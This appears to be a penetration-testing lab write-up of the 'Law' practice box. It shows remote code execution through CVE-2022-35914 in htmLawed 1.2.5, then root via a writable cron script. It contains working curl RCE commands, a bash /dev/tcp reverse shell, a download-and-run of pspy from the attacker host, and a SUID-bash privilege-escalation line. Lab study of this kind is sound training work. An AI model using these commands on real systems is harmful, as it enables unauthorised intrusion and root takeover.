title: Law Retrospective — CVE-2022-35914 RCE to Writable Cron Script
body:
Law was a two-step box: CVE recognition to RCE foothold, writable cron script to root. No enumeration maze, no rabbit holes — but three sharp lessons about CVE exploit quirks, cron privesc cash-in methods, and why the official clean path (chmod u+s /bin/bash) beats a reverse shell when you're abusing a cron.

Chain: htmLawed 1.2.5 on port 80 -> Google CVE-2022-35914 -> curl RCE exploit (sid cookie + hhook=exec parameter) -> 404 redirect to .php fixed in Burp -> www-data shell -> LinPEAS finds /var/www/cleanup.sh writable -> pspy confirms UID=0 runs it every minute -> echo 'chmod u+s /bin/bash' >> cleanup.sh -> wait one minute -> /bin/bash -p -> euid=0(root) -> proof.txt.

-- FIVE LESSONS --

  1. VERSION ON THE PAGE IS THE CVE
     The page title was literally 'htmLawed (1.2.5) test'. That version string
     is the entire enumeration step. Google 'htmlawed 1.2.5 cve' or 'htmlawed
     cve' and CVE-2022-35914 is the first result. Recognition pattern: when
     an app displays its version prominently (title, footer, header comment),
     that version is the attack surface. Search it before touching anything else.

  2. CVE-2022-35914 MECHANISM — hhook PARAMETER
     htmLawed's test page accepts POST parameters. The vulnerability: the hhook
     parameter sets a PHP callback function. Set hhook=exec and text=<command>
     and the app executes the command via exec(). The sid cookie must match the
     sid POST parameter (sid=foo in both). One curl command = RCE:
       curl -s -d 'sid=foo&hhook=exec&text=id' -b 'sid=foo' http://$ip
     No auth, no login, no enumeration — the test page is public by default.

  3. EXPLOIT SCRIPT 404 -> REDIRECT TO .PHP = STRIP THE EXTENSION IN BURP
     The bash exploit was hitting a 404 because the server redirected the
     request to a .php extension URL. The fix: intercept in Burp, remove the
     .php from the redirect URL, forward. Or: hit the .php directly:
       curl -s -d 'sid=foo&hhook=exec&text=id' -b 'sid=foo' http://$ip/index.php
     When an exploit gets a 404, check if there's a redirect happening (302
     Location header) — follow it or adjust the target URL.

  4. WRITABLE CRON SCRIPT: chmod u+s /bin/bash > REVERSE SHELL
     The cleanup.sh approach used in the run was a nc reverse shell added to
     the script. The official OffSec method is cleaner and more reliable:
       echo 'chmod u+s /bin/bash' >> cleanup.sh
     Wait one minute. Then: /bin/bash -p -> euid=0(root). No listener needed,
     no timing required, no firewall issues. The SUID bash persists across
     reboots too. For ANY root-executed writable script: chmod u+s /bin/bash
     is the cleanest cash-in. Reverse shell is the fallback.

  5. PSPY CONFIRMS THE CRON BEFORE YOU COMMIT
     LinPEAS spotted the writable /var/www/cleanup.sh but pspy confirmed that
     UID=0 was actually running it every minute. That confirmation matters:
     a writable script run as root is game over, but a writable script run as
     nobody is useless. Always confirm with pspy before modifying any script.
     Look for: CMD: UID=0 PID=xxxxx | /bin/bash /path/to/script.sh

-- REUSABLE CHAIN (CVE app -> writable cron script) --

  1. Version on page -> searchsploit <app> OR Google '<app> <version> cve'
  2. Test exploit with whoami first (confirm RCE before reverse shell)
  3. 404 on exploit? -> check for redirect in Burp, adjust target URL
  4. www-data shell -> LinPEAS -> find writable scripts in /var/www, /opt, /tmp
  5. pspy -> confirm UID=0 runs the script (watch 2-3 minutes)
  6. echo 'chmod u+s /bin/bash' >> <script> -> wait -> /bin/bash -p -> root
  Proof: cat /root/proof.txt
cmd:
# ── LAW PATTERN -- CVE RCE -> writable cron script -> SUID bash -> root ──

# 1) VERSION RECOGNITION -> CVE SEARCH
# Page title: 'htmLawed (1.2.5) test' -> Google 'htmlawed 1.2.5 cve'
# -> CVE-2022-35914

# 2) RCE (CVE-2022-35914 -- hhook=exec parameter)
# The sid cookie must match the sid POST parameter.
curl -s -d 'sid=foo&hhook=exec&text=id' -b 'sid=foo' http://$ip/index.php
# If 404: check Location header -> add .php to URL or remove redirect
# Reverse shell:
curl -s -d 'sid=foo&hhook=exec&text=bash+-c+"bash+-i+>%26+/dev/tcp/$lhost/443+0>%261"' -b 'sid=foo' http://$ip/index.php

# 3) FIND WRITABLE SCRIPTS (post-foothold)
find /var/www /opt /etc -writable -name '*.sh' 2>/dev/null
ls -la /var/www/*.sh 2>/dev/null

# 4) CONFIRM WITH PSPY (UID=0 = root runs it)
wget http://$lhost/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
# Look for: CMD: UID=0 ... | /bin/bash /var/www/cleanup.sh

# 5) CASH IN -- chmod u+s /bin/bash (cleanest, no listener needed)
echo 'chmod u+s /bin/bash' >> /var/www/cleanup.sh
# wait ~1 minute for the cron to fire
ls -la /bin/bash    # should show -rwsr-xr-x (s = SUID set)
/bin/bash -p        # -p = privileged mode, keeps euid=0
id                  # uid=33(www-data) euid=0(root) -> root
cat /root/proof.txt
warn: Three Law traps: (1) PwnKit was present (pkexec 0.105) but didn't work — kernel exploits and CVE tools are not guaranteed; always have a manual privesc path (LinPEAS + pspy) as the fallback. (2) The nc reverse shell in cleanup.sh works but is fragile (timing, firewall, listener must be up exactly when cron fires); chmod u+s /bin/bash is more reliable and requires no listener. (3) The 404 on the exploit script was a redirect to .php — always check the Location header when an exploit gets a 404 before assuming the target isn't vulnerable.
